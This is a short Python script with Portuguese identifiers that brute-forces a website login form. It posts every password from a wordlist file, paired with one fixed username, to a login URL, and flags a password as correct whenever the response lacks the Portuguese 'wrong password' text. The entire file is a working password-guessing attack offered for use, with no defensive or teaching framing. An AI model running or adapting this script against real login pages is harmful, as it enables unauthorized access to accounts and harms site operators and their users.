import requests

url = 'http://siterandombrazil/login_page/'

arquivo = open('wordlist.txt')
linhas = arquivo.readlines()

for linha in linhas:
    dados = {'username': 'auba@example.com',
             'password': linha}

    resposta = requests.post(url, data=dados)

    if "senha errados" in resposta.text:
        print("Senha incorreta:", linha)
    else:
        print("Senha correta:", linha)